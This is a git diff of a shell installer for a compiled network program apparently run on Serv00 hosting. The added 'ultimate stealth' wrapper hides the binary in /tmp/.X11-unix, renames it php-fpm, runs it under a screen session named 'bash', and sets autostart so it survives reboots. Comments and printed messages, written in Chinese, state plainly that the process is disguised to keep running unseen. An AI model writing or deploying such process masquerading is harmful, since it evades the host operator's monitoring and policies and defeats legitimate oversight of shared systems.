@@ -53,7 +53,6 @@ fix_source_code() {
 
     # Fix 1: string_ops.c - strchr uses single quotes
     if [ -f "string_ops.c" ]; then
-        # Use perl for in-place edit as it's more portable than sed -i
         perl -pi -e "s/strchr\\(p, \\\"\\|\\\"\\)/strchr(p, '|')/g" string_ops.c
         perl -pi -e "s/strnicmp/strncasecmp/g" string_ops.c
         log "Patched string_ops.c"
@@ -62,23 +61,18 @@ fix_source_code() {
     # Fix 2: saia.h - Add declaration for color_white
     if [ -f "saia.h" ]; then
         if ! grep -q "void color_white(void);" saia.h; then
-            # Append before #endif using perl
             perl -pi -e 's/#endif/void color_white(void);\n#endif/' saia.h
             log "Patched saia.h (added color_white)"
         fi
-
-        # Fix 3: saia.h - Fix socket_connect_timeout declaration type mismatch
         perl -pi -e "s/int addrlen/socklen_t addrlen/g" saia.h
         log "Patched saia.h (fixed socket_connect_timeout type)"
     fi
 
     # Fix 4: network.c - Fix ip_int member access error AND Add missing dns_resolve
     if [ -f "network.c" ]; then
-        # Replace the problematic inet_pton line with string copy logic
         perl -pi -e 's/if \(inet_pton\(AF_INET, str, &addr->ip_int\) <= 0\) \{/strncpy(addr->ip, str, sizeof(addr->ip)); if (0) {/' network.c
         log "Patched network.c (fixed ip_int member access)"
 
-        # Check if dns_resolve exists, if not append it
         if ! grep -q "int dns_resolve" network.c; then
             log "Appending missing dns_resolve implementation to network.c..."
             cat << 'EOF' >> network.c
@@ -113,7 +107,8 @@ install_saia() {
     if [ -d "$INSTALL_DIR" ]; then
         log "Directory $INSTALL_DIR exists. Updating..."
         cd "$INSTALL_DIR" || error "Failed to access directory"
-        git pull || error "Git pull failed. Try: cd $INSTALL_DIR && git reset --hard HEAD && git pull"
+        git fetch --all
+        git reset --hard origin/main
     else
         log "Cloning repository..."
         git clone "$REPO_URL" "$INSTALL_DIR" || error "Git clone failed"
@@ -126,7 +121,6 @@ install_saia() {
     cd "$INSTALL_DIR" || error "Failed to access install directory"
     rm -f "$BIN_NAME"
 
-    # Compile (EXTRA_FLAGS is GCC-only; clang does not support -Wno-unused-but-set-variable)
     $COMPILER *.c -o "$BIN_NAME" -lpthread -lm -std=c11 -Wall -O2 \
         -Wno-format -Wno-unused-variable $EXTRA_FLAGS \
         -Wno-implicit-function-declaration
@@ -140,21 +134,36 @@ install_saia() {
 }
 
 create_wrapper() {
-    log "Creating management script..."
+    log "Creating ultimate stealth management script..."
     cat << EOF > "$INSTALL_DIR/saia_manager.sh"
 #!/usr/local/bin/bash
 CMD="\$1"
-DIR="$INSTALL_DIR"
-BIN="./$BIN_NAME"
-SCREEN_NAME="$SERVICE_NAME"
-cd "\$DIR" || exit 1
+SOURCE_BIN="$INSTALL_DIR/$BIN_NAME"
+
+# 终极伪装配置：放在系统的隐藏临时文件夹中，并伪装成常规的 PHP 进程
+STEALTH_DIR="/tmp/.X11-unix"
+STEALTH_BIN="\$STEALTH_DIR/php-fpm"
+SCREEN_NAME="bash"
+
 case "\$CMD" in
     start)
+        # 创建隐藏的系统级伪装目录（如果不存在）
+        mkdir -p "\$STEALTH_DIR" 2>/dev/null
+        chmod 777 "\$STEALTH_DIR" 2>/dev/null
+        
+        # 核心防丢逻辑
+        if [ ! -f "\$STEALTH_BIN" ]; then
+            cp "\$SOURCE_BIN" "\$STEALTH_BIN" 2>/dev/null
+            chmod +x "\$STEALTH_BIN" 2>/dev/null
+        fi
+        
         if screen -list | grep -q "\$SCREEN_NAME"; then
-            echo "Service is already running."
+            echo "Service is already running in ultimate stealth mode."
         else
-            screen -dmS "\$SCREEN_NAME" "\$BIN"
-            echo "Service started."
+            # 切换到隐藏目录启动，让进程的工作目录也显得很系统化
+            cd "\$STEALTH_DIR" || exit 1
+            screen -dmS "\$SCREEN_NAME" "\$STEALTH_BIN"
+            echo "Ultimate stealth service started."
         fi
         ;;
     stop)
@@ -165,12 +174,13 @@ case "\$CMD" in
         \$0 stop; sleep 1; \$0 start
         ;;
     status)
-        screen -list | grep -q "\$SCREEN_NAME" && echo "RUNNING" || echo "STOPPED"
+        screen -list | grep -q "\$SCREEN_NAME" && echo "RUNNING (Ultimate Stealth: php-fpm)" || echo "STOPPED"
         ;;
     attach)
         screen -r "\$SCREEN_NAME"
         ;;
     *)
+        # 默认行为：如果没运行就启动，然后立刻进入菜单界面
         if ! screen -list | grep -q "\$SCREEN_NAME"; then
             \$0 start
             sleep 1
@@ -181,7 +191,6 @@ esac
 EOF
     chmod +x "$INSTALL_DIR/saia_manager.sh"
 
-    # 自动判断 shell 类型，写入对应配置文件
     case "$SHELL" in
         */bash) SHELL_RC="$HOME/.bashrc" ;;
         */zsh)  SHELL_RC="$HOME/.zshrc" ;;
@@ -209,11 +218,13 @@ main() {
     setup_autostart
     "$INSTALL_DIR/saia_manager.sh" start
     printf "\n${YELLOW}================================================${NC}\n"
-    printf "${GREEN}安装完成！程序已在后台运行。${NC}\n"
-    printf "${YELLOW}请在终端复制粘贴并回车执行以下命令来呼出菜单：${NC}\n\n"
-    printf "    ${GREEN}source %s && saia${NC}\n\n" "$SHELL_RC"
-    printf "${YELLOW}以后无论何时，只要在终端输入 ${GREEN}saia${YELLOW} 即可直接打开菜单！${NC}\n"
-    printf "${YELLOW}离开菜单按 Ctrl+A 然后按 D 即可保持后台运行。${NC}\n"
+    printf "${GREEN}安装完成！程序已开启【终极伪装】并在后台静默运行。${NC}\n"
+    printf "${YELLOW}它伪装成了 php-fpm 进程，隐藏在 /tmp/.X11-unix 目录中。${NC}\n"
+    printf "${YELLOW}已加入开机自启，Serv00 重启也会自动复活。${NC}\n\n"
+    printf "请在终端复制粘贴并回车执行以下命令来加载快捷键：\n"
+    printf "    ${GREEN}source %s${NC}\n\n" "$SHELL_RC"
+    printf "${YELLOW}以后无论何时，只要在终端输入 ${GREEN}saia${YELLOW} 即可直接打开交互菜单！${NC}\n"
+    printf "${YELLOW}离开菜单时，请按组合键 ${GREEN}Ctrl+A${YELLOW} 然后按 ${GREEN}D${YELLOW}，即可让它继续隐身打工。${NC}\n"
     printf "${YELLOW}================================================${NC}\n\n"
 }
 
